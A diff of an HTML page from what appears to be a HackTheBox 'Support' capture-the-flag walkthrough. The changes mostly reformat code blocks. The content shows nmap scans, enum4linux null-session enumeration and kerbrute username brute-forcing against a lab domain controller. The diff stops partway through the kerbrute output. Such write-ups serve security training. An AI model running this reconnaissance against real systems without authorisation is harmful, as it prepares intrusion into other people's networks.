@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17212,183 +17235,290 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </table>
 <h2 id="getting-usertxt-flag">Getting user.txt flag</h2>
 <p>Run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">ip</span><span class="o">=</span><span class="m">10</span>.10.11.174
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">ip</span><span class="o">=</span><span class="m">10</span>.10.11.174
+</span></code></pre></div></td></tr></table></div>
 <h3 id="reconnaissance">Reconnaissance</h3>
 <h4 id="service-port-enumeration">Service/ Port enumeration</h4>
 <p>Run nmap to enumerate open ports, services, OS, and traceroute. Do a general enumeration not to make too much noise:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-Pn
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-Pn
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Nmap scan report for 10.10.11.174
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Host is up (0.034s latency).
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>Not shown: 989 filtered tcp ports (no-response)
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>PORT     STATE SERVICE
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>53/tcp   open  domain
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>88/tcp   open  kerberos-sec
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>135/tcp  open  msrpc
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>139/tcp  open  netbios-ssn
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>389/tcp  open  ldap
-</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>445/tcp  open  microsoft-ds
-</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>464/tcp  open  kpasswd5
-</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>593/tcp  open  http-rpc-epmap
-</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>636/tcp  open  ldapssl
-</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>3268/tcp open  globalcatLDAP
-</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>3269/tcp open  globalcatLDAPssl
-</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>
-</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-2-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-2-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-2-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-2-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-2-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-2-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-2-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-2-10">10</a></span>
+<span class="normal"><a href="#__codelineno-2-11">11</a></span>
+<span class="normal"><a href="#__codelineno-2-12">12</a></span>
+<span class="normal"><a href="#__codelineno-2-13">13</a></span>
+<span class="normal"><a href="#__codelineno-2-14">14</a></span>
+<span class="normal"><a href="#__codelineno-2-15">15</a></span>
+<span class="normal"><a href="#__codelineno-2-16">16</a></span>
+<span class="normal"><a href="#__codelineno-2-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>Nmap scan report for 10.10.11.174
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>Host is up (0.034s latency).
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>Not shown: 989 filtered tcp ports (no-response)
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>PORT     STATE SERVICE
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a>53/tcp   open  domain
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a>88/tcp   open  kerberos-sec
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a>135/tcp  open  msrpc
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a>139/tcp  open  netbios-ssn
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9"></a>389/tcp  open  ldap
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10"></a>445/tcp  open  microsoft-ds
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11"></a>464/tcp  open  kpasswd5
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12"></a>593/tcp  open  http-rpc-epmap
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13"></a>636/tcp  open  ldapssl
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14"></a>3268/tcp open  globalcatLDAP
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15"></a>3269/tcp open  globalcatLDAPssl
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16"></a>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17"></a>Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds
+</span></code></pre></div></td></tr></table></div>
 <p>Once you know open ports, run nmap to see service versions and more details:   </p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sCV<span class="w"> </span>-p3,88,135,139,389,445,464,593,636,3268,3269<span class="w"> </span><span class="nv">$ip</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sCV<span class="w"> </span>-p3,88,135,139,389,445,464,593,636,3268,3269<span class="w"> </span><span class="nv">$ip</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>Nmap scan report for 10.10.11.174
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>Host is up (0.034s latency).
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>PORT     STATE SERVICE       VERSION
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>53/tcp   open  domain        Simple DNS Plus
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-08 15:56:45Z)
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>135/tcp  open  msrpc         Microsoft Windows RPC
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
-</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>445/tcp  open  microsoft-ds?
-</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>464/tcp  open  kpasswd5?
-</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>636/tcp  open  tcpwrapped
-</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
-</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>3269/tcp open  tcpwrapped
-</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
-</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>
-</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>Host script results:
-</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>| smb2-time:
-</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>|   date: 2022-11-08T15:56:49
-</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>|_  start_date: N/A
-</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>| smb2-security-mode:
-</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>|   3.1.1:
-</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>|_    Message signing enabled and required
-</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>
-</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a>Nmap done: 1 IP address (1 host up) scanned in 49.69 seconds
-</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a>zsh: segmentation fault  sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269 $ip
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-4-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-4-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-4-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-4-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-4-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-4-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-4-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-4-10">10</a></span>
+<span class="normal"><a href="#__codelineno-4-11">11</a></span>
+<span class="normal"><a href="#__codelineno-4-12">12</a></span>
+<span class="normal"><a href="#__codelineno-4-13">13</a></span>
+<span class="normal"><a href="#__codelineno-4-14">14</a></span>
+<span class="normal"><a href="#__codelineno-4-15">15</a></span>
+<span class="normal"><a href="#__codelineno-4-16">16</a></span>
+<span class="normal"><a href="#__codelineno-4-17">17</a></span>
+<span class="normal"><a href="#__codelineno-4-18">18</a></span>
+<span class="normal"><a href="#__codelineno-4-19">19</a></span>
+<span class="normal"><a href="#__codelineno-4-20">20</a></span>
+<span class="normal"><a href="#__codelineno-4-21">21</a></span>
+<span class="normal"><a href="#__codelineno-4-22">22</a></span>
+<span class="normal"><a href="#__codelineno-4-23">23</a></span>
+<span class="normal"><a href="#__codelineno-4-24">24</a></span>
+<span class="normal"><a href="#__codelineno-4-25">25</a></span>
+<span class="normal"><a href="#__codelineno-4-26">26</a></span>
+<span class="normal"><a href="#__codelineno-4-27">27</a></span>
+<span class="normal"><a href="#__codelineno-4-28">28</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>Nmap scan report for 10.10.11.174
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>Host is up (0.034s latency).
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>PORT     STATE SERVICE       VERSION
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a>53/tcp   open  domain        Simple DNS Plus
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-08 15:56:45Z)
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a>135/tcp  open  msrpc         Microsoft Windows RPC
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a>445/tcp  open  microsoft-ds?
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a>464/tcp  open  kpasswd5?
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12"></a>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13"></a>636/tcp  open  tcpwrapped
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14"></a>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15"></a>3269/tcp open  tcpwrapped
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16"></a>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17"></a>
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18"></a>Host script results:
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19"></a>| smb2-time:
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20"></a>|   date: 2022-11-08T15:56:49
+</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21"></a>|_  start_date: N/A
+</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22"></a>| smb2-security-mode:
+</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23"></a>|   3.1.1:
+</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24"></a>|_    Message signing enabled and required
+</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25"></a>
+</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26"></a>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27"></a>Nmap done: 1 IP address (1 host up) scanned in 49.69 seconds
+</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28"></a>zsh: segmentation fault  sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269 $ip
+</span></code></pre></div></td></tr></table></div>
 <p>A few facts that you can gather after running this scan are:
 + There is a Windows Server running an Active Directory LDAP in the machine.
 + ldap and kerberos are available.
 + Domain: support.htb0.</p>
 <h4 id="enumerate">Enumerate</h4>
 <p>Now, we can perform some basic enumeration to gather data about the target.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>enum4linux<span class="w"> </span><span class="m">10</span>.10.11.174
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>enum4linux<span class="w"> </span><span class="m">10</span>.10.11.174
+</span></code></pre></div></td></tr></table></div>
 <p>Among the lines in the results, you can see these interesting lines:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>=========================================( Target Information )=========================================
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a> ===================================( Session Check on 10.10.11.174 )===================================    
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>[+] Server 10.10.11.174 allows sessions using username &#39;&#39;, password &#39;&#39;
-</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
-</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>================================( Getting domain SID for 10.10.11.174 )================================             
-</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>Domain Name: SUPPORT                                                                     
-</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>Domain Sid: S-1-5-21-1677581083-3380853377-188903654
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
+<span class="normal"><a href="#__codelineno-6-2">2</a></span>
+<span class="normal"><a href="#__codelineno-6-3">3</a></span>
+<span class="normal"><a href="#__codelineno-6-4">4</a></span>
+<span class="normal"><a href="#__codelineno-6-5">5</a></span>
+<span class="normal"><a href="#__codelineno-6-6">6</a></span>
+<span class="normal"><a href="#__codelineno-6-7">7</a></span>
+<span class="normal"><a href="#__codelineno-6-8">8</a></span>
+<span class="normal"><a href="#__codelineno-6-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>=========================================( Target Information )=========================================
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a> ===================================( Session Check on 10.10.11.174 )===================================    
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a>[+] Server 10.10.11.174 allows sessions using username &#39;&#39;, password &#39;&#39;
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6"></a>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7"></a>================================( Getting domain SID for 10.10.11.174 )================================             
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8"></a>Domain Name: SUPPORT                                                                     
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9"></a>Domain Sid: S-1-5-21-1677581083-3380853377-188903654
+</span></code></pre></div></td></tr></table></div>
 <p>Using the tool kerbrute, we will enumerate some valid usernames in the active directory:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>(kali㉿kali)-[~/tools/kerbrute/dist]
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>└─$ ./kerbrute_linux_amd64 userenum -d support --dc 10.10.11.174 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>(kali㉿kali)-[~/tools/kerbrute/dist]
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a>└─$ ./kerbrute_linux_amd64 userenum -d support --dc 10.10.11.174 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>    __             __               __     
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>   / /_____  _____/ /_  _______  __/ /____
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
-</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
-</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
-</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>Version: dev (9cfb81e) - 11/09/22 - Ronnie Flathers @ropnop
-</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>
-</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>2022/11/09 05:16:54 &gt;  Using KDC(s):
-</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>2022/11/09 05:16:54 &gt;   10.10.11.174:88
-</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>
-</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>2022/11/09 05:16:56 &gt;  [+] VALID USERNAME:  support@support
-</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>2022/11/09 05:16:57 &gt;  [+] VALID USERNAME:  guest@support
-</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>2022/11/09 05:17:03 &gt;  [+] VALID USERNAME:  administrator@support
-</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>2022/11/09 05:17:52 &gt;  [+] VALID USERNAME:  Guest@support
-</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>2022/11/09 05:17:53 &gt;  [+] VALID USERNAME:  Administrator@support
-</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>2022/11/09 05:19:42 &gt;  [+] VALID USERNAME:  management@support
-</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>2022/11/09 05:19:59 &gt;  [+] VALID USERNAME:  Support@support
-</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a>2022/11/09 05:20:52 &gt;  [+] VALID USERNAME:  GUEST@support
-</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a>2022/11/09 05:31:02 &gt;  [+] VALID USERNAME:  SUPPORT@support
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-8-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-8-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-8-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-8-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-8-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-8-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-8-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-8-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-8-10">10</a></span>
+<span class="normal"><a href="#__codelineno-8-11">11</a></span>
+<span class="normal"><a href="#__codelineno-8-12">12</a></span>
+<span class="normal"><a href="#__codelineno-8-13">13</a></span>
+<span class="normal"><a href="#__codelineno-8-14">14</a></span>
+<span class="normal"><a href="#__codelineno-8-15">15</a></span>
+<span class="normal"><a href="#__codelineno-8-16">16</a></span>
+<span class="normal"><a href="#__codelineno-8-17">17</a></span>
+<span class="normal"><a href="#__codelineno-8-18">18</a></span>
+<span class="normal"><a href="#__codelineno-8-19">19</a></span>
+<span class="normal"><a href="#__codelineno-8-20">20</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>    __             __               __     
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>   / /_____  _____/ /_  _______  __/ /____
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6"></a>
